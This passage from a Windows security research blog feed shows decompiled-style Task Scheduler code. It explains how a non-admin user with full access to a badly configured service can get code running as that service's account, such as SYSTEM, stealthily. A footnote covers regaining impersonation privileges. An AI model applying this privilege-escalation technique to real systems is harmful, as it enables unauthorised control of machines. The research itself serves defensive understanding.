10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">FromImpersonationToken</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(&amp;</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">caller</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">);</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;RpcRevertToSelf</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">();</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">if</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">tsched</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">::</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">IsUserAdmin</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">caller</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">)</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">||</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;caller.IsLocalSystem</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">caller</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">))</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">return</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> TRUE</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">if</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">principal </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">==</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> caller</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">)</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">return</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> TRUE</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\"><br /></span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">if</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">principal</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">.</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">IsServiceSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">())</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;LPCWSTR Name </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> principal</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">.</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">GetAccount</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">();</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;RpcAutoImpersonate</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">::</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">RpcAutoImpersonate</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">();</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;SC_HANDLE scm </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> OpenSCManager</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">NULL</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">NULL</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> SC_MANAGER_CONNECT</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">);</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;SC_HANDLE service </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> OpenService</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">scm</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> Name</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> SERVICE_ALL_ACCESS</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">);</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;RpcRevertToSelf</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">();</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">if</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">service</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">)</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">return</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> TRUE</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">return</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> FALSE</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\">The <i>IsPrincipalAllowed </i>function first checks if the caller is an administrator or SYSTEM. If it is then any principal is allowed (again not completely true, but good enough). Next it checks if the principal's user SID matches the one we're setting. This is what would allow NS/LS or a virtual service account to specify a task running as their own user account.&nbsp;</p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><br /></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\">Finally, if the principal is a service SID, then it tries to open the service for full access while impersonating the caller. If that succeeds it allows the service SID to be used as a principal. This behaviour is interesting as it allows for a sneaky way to abuse badly configured services.&nbsp;</p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><br /></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\">It's a well known check for privilege escalation that you enumerate all local services and see if any of them grant a normal user privileged access rights, mainly <i>SERVICE_CHANGE_CONFIG</i>. This is enough to hijack the service and get arbitrary code running as the service account. A common trick is to change the executable path and restart the service, but this isn't great for a few different reasons.</p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"></p><ol style=\"text-align: left;\"><li>Changing the executable path could easily be noticed.</li><li>You probably want to fix the path back again afterwards, which is just a pain.</li><li>If the service is currently running you'll need stop the service, then restart the modified service to get the code execution.</li></ol><div>However, as long as your account is granted full access to the service you can use the task scheduler even without being an administrator to get code running as the service's user account, such as SYSTEM, without ever needing to modify the service's configuration directly or stop/start the service. Much more sneaky. Of course this does mean that the token the task runs under might have privileges stripped etc, but that's something which is easy enough to deal with (as long as it's not write restricted).</div><div><br /></div><div>This is a good lesson on how to never take things on face value. I just assumed the caller would need administrator privileges to set the service account as the principal for a task. But it seems that's not actually required if you dig into the code. Hopefully someone will find it useful.</div><div><br /></div><div><span style=\"color: #eeeeee;\">Footnote: If you read this far, you might also ask, can you get back <i>SeImpersonatePrivilege </i>from a virtual service account or not? Of course, you just use the named pipe trick I described in a <a href=\"https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html\">previous blog post</a>. Because of the way that the token is created the token stored in the logon session will still have all the assigned privileges. You can extract the token by using the named pipe to your own service, and use that to create a new process and get back all the missing privileges.</span></div><p></p><div><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\"><br /></span></div><p><br /></p><p><br /></p><p><br /></p><p><br /></p>", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/8262121054453143061"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/8262121054453143061"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2021/06/a-little-more-on-task-schedulers.html", "title": "A Little More on the Task Scheduler's Service Account Usage"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-2152994535793869192", "guidislink": true, "link": "https://www.tiraniddo.dev/2021/06/the-much-misunderstood.html", "published": "2021-06-02T14:49:00.000-07:00", "published_parsed": [2021, 6, 2, 21, 49, 0, 2, 153, 0], "updated": "2021-06-02T14:49:12.646-07:00", "updated_parsed": [2021, 6, 2, 21, 49, 12, 2, 153, 0], "title": "The Much Misunderstood SeRelabelPrivilege", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "The Much Misunderstood SeRelabelPrivilege"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "<p>Based on my <a href=\"https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html\">previous blog post</a> I recently had a conversation with a friend and well-known Windows security researcher about token privileges. Specifically, I was musing on how <i>SeTrustedCredmanAccessPrivilege</i> is not a \"God\" privilege. After some back and forth it seemed we were talking at cross purposes. My concept of a \"God\" privilege is one which the kernel considers to make a token elevated (see&nbsp;<a href=\"https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-3.html\">Reading Your Way Around UAC (Part 3)</a>) and so doesn't make it available to any token with an integrity level less than <i>High</i>. They on the other hand consider such a privilege to be one where you can directly compromise a resource or the OS as a whole by having the privilege enabled, this might include privileges which aren't strictly a \"God\" from the kernel's perspective but can still allow system compromise.</p><p>After realizing the misunderstanding I was still surprised that one of the privileges in their list wasn't considering a \"God\", specifically&nbsp;<i>SeRelabelPrivilege</i>. It seems that there's perhaps some confusion as to what this privilege actually allows you to do, so I thought it'd be worth clearing it up.</p><p><i>Point of pedantry: I don't believe it's correct to say that a resource has an integrity level. It instead has a mandatory label, which is stored in an ACE in the SACL. That ACE contains a SID which maps to an integrity level and an mandatory policy which is stored in the access mask. The combination of integrity level and policy is what determines what access is granted (although you can't grant write up through the policy). The token on the other hand does have an integrity level and a separate mandatory policy, which isn't the same as the one in the ACE. Oddly you specify the value when calling <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-settokeninformation\">SetTokenInformation</a> using a <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_mandatory_label\">TOKEN_MANDATORY_LABEL</a> structure, confusing I know.</i></p><p>As with a lot of privileges which don't get used very often the official documentation is not great. You can find the MSDN documentation&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/modify-an-object-label\">here</a>. The page is worse than usual as it seems to have been written at a time in the Vista/Longhorn development when the <a href=\"https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control\">Mandatory Integrity Control (MIC)</a> (or as it calls it <i>Windows Integrity Control (WIC)</i>) feature was still in flux. For example, it mentions an 